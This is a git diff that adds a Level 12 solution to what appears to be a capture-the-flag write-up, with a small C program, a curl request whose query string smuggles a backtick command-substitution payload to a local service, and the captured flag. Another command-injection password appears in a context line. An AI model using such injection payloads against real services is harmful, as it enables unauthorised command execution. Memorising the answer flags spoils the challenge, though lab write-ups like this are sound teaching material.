@@ -199,3 +199,26 @@ Password: `getflag > /tmp/key; echo test`
 	<summary>Flag:</summary>
 	fa6v5ateaw21peobuub8ipe6s
 </details>
+
+# Level 12
+
+```c
+#include <stdlib.h>
+
+int main() {
+    system("getflag > /tmp/flag");
+    return 0;
+}
+```
+
+```sh
+$ curl 'localhost:4646?x=`/*/CODE`'
+$ cat /tmp/flag
+```
+
+<details>
+	<summary>Flag:</summary>
+	g1qKMiRpXf53AWhDaU7FEkczr
+</details>
+
+
